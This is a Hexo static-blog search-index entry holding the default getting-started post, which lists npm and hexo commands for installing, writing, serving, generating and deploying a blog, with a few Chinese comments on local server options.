        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="install-hexo"><a class="markdownIt-Anchor" href="#install-hexo"></a> install Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g</span><br></pre></td></tr></table></figure><h3 id="upgrade-hexo"><a class="markdownIt-Anchor" href="#upgrade-hexo"></a> upgrade Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update hexo -g</span><br></pre></td></tr></table></figure><h3 id="init-blog"><a class="markdownIt-Anchor" href="#init-blog"></a> init Blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"My New Post"</span> </span><br><span class="line">hexo n <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="clear-cache"><a class="markdownIt-Anchor" href="#clear-cache"></a> Clear cache</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><h3 id="local-testing"><a class="markdownIt-Anchor" href="#local-testing"></a> Local Testing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p 5000 <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment">#自定义 IP</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
